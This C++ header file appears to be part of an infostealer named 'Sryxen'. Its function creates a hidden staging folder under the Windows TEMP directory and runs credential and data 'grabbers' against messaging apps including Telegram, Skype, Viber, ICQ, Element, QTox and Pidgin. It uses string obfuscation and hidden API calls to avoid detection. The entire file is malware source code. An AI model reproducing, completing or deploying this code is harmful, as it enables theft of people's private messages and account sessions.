#ifndef ENTRYPOINT_SOCIALS_HPP
#define ENTRYPOINT_SOCIALS_HPP

#include <iostream>
#include <string>
#include "Winapi_structs.hpp"
#include "Element.hpp"
#include "ICQ.hpp"
#include "Viber.hpp"
//#include "Signal.hpp"
#include "Telegram.hpp"
#include "QTox.hpp"
#include "Pidgin.hpp"
#include "Skype.hpp"
#include "obfusheader.h"
#include "Helper.h"

namespace Socials {
    inline void Run() {
        DEBUG_PRINT(L"Socials Grabber Started");
        char* tempPath = nullptr;
        size_t requiredSize = 0;
        _dupenv_s(&tempPath, &requiredSize, OBF("TEMP"));

        if (!tempPath) return;

        std::string baseDir = std::string(tempPath) + OBF("\\Sryxen\\Socials");
        free(tempPath);

        if (!HiddenCalls::CreateDirectoryA(baseDir.c_str(), NULL)) return;

        Element::Extract(baseDir);
        ICQ::Extract(baseDir);
        Viber::Extract(baseDir);
        //Signal::Extract(baseDir);
        Telegram::Extract(baseDir);
        QTox::Extract(baseDir);
        Pidgin::Extract(baseDir);
        Skype::Extract(baseDir);
        DEBUG_PRINT(L"Socials Grabber Finished");
    }
}

#endif
